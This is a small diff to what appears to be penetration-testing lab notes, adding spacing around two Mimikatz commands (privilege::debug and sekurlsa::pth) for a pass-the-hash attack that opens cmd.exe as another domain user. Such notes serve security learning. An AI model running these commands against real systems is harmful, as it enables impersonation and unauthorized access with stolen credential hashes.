@@ -70,7 +70,9 @@ Attempt to RDP. Simple!
 #### Mimilatz
 
 The command should spawn a new cmd.exe process with the credentials of the user we’re trying to impersonate.
+
 `privilege::debug`
+
 `sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH /run:cmd.exe`
 
 Pass the has without starting a session
